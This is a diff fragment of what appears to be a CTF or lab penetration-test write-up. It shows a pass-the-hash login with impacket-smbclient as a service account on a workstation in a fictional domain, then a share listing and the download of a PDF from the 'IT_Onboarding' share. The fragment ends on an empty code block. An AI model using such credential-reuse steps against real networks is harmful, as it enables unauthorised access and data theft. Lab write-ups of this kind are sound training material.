@@ -809,3 +809,29 @@ SMB         10.1.206.115    445    IT-WS01          IT_Onboarding   READ
 
 I do have read on a non-default SMB share on the IT workstation
 
+# `IT_Onboarding` share on `IT-WS01`
+
+```python
+impacket-smbclient ctos.corp/svc_web@it-ws01.ctos.corp -hashes ':4014777d5f38cb74d24f096972f47969'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+IT_Onboarding
+# use IT_Onboarding
+# ls
+drw-rw-rw-          0  Sun Feb 15 09:26:28 2026 .
+drw-rw-rw-          0  Sun Feb 15 09:13:03 2026 ..
+-rw-rw-rw-      32951  Sun Feb 15 09:26:31 2026 SEC-POL-2026.pdf
+# get SEC-POL-2026.pdf
+# 
+```
+
+I have a PDF file
+
+```python
+
+```
